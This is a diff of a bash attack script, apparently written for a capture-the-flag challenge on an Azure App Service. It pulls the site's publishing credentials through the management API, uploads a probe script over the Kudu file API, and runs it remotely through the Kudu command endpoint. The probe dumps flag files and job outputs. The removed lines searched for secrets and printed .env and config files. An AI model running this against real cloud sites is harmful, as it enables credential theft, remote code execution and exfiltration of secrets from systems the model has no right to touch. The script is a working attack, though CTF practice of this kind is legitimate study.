@@ -16,16 +16,13 @@ PUB=$(curl -s -X POST "$BASE/config/publishingcredentials/list?api-version=2022-
 KU=$(echo "$PUB" | jq -r '.properties.publishingUserName'); KP=$(echo "$PUB" | jq -r '.properties.publishingPassword')
 SCM="https://$SITE.scm.azurewebsites.net"
 cat > probe.sh <<'PROBE'
-echo "=== tree ==="
-ls -laR /home/site/wwwroot 2>/dev/null | head -120
-echo "=== grep ==="
-grep -rniE 'flag|cyberjutsu|df26|dfctf|paydojo|secret|kv-tbl-sec' /home/site/wwwroot 2>/dev/null | head -60
-echo "=== flag files ==="
-find /home -maxdepth 5 -iname '*flag*' 2>/dev/null
-echo "=== python src ==="
-for f in $(find /home/site/wwwroot -maxdepth 2 -name '*.py' -o -maxdepth 2 -name '*.env' -o -maxdepth 2 -name '*.json' -o -maxdepth 2 -name '*.cfg' 2>/dev/null); do echo "--- $f"; cat "$f"; echo; done
+echo "=== known output files ==="
+for f in .flag.out flag_result.txt ctf_flag_result myres.txt results.json tnex_flag.json _tbl_out.json flag_hunt.out g_out1.txt out14.txt; do echo "----- $f"; cat "/home/site/wwwroot/$f" 2>/dev/null; echo; done
+echo "=== App_Data job results ==="
+find /home/site/wwwroot/App_Data -type f \( -name '*.json' -o -name '*.out' -o -name '*.txt' \) 2>/dev/null | while read f; do echo "--- $f"; cat "$f" 2>/dev/null; echo; done
+echo "=== FLAG values across wwwroot ==="
+grep -rhoE '(FLAG|flag|DF26|df26|CJ|DFCTF|cyberjutsu|DFC)\{[^}]{2,120}\}' /home/site/wwwroot 2>/dev/null | sort -u | head -40
 PROBE
-echo "KU=$KU KP_LEN=${#KP}"
 curl -s -u "$KU:$KP" -X PUT "$SCM/api/vfs/site/wwwroot/probe.sh" -H "If-Match: *" --data-binary @probe.sh -o /dev/null -w "PUT=%{http_code}\n"
 curl -s -u "$KU:$KP" -X POST "$SCM/api/command" -H "Content-Type: application/json" -d "{\"command\":\"bash /home/site/wwwroot/probe.sh\",\"dir\":\"/home\"}" | head -c 12000
 echo
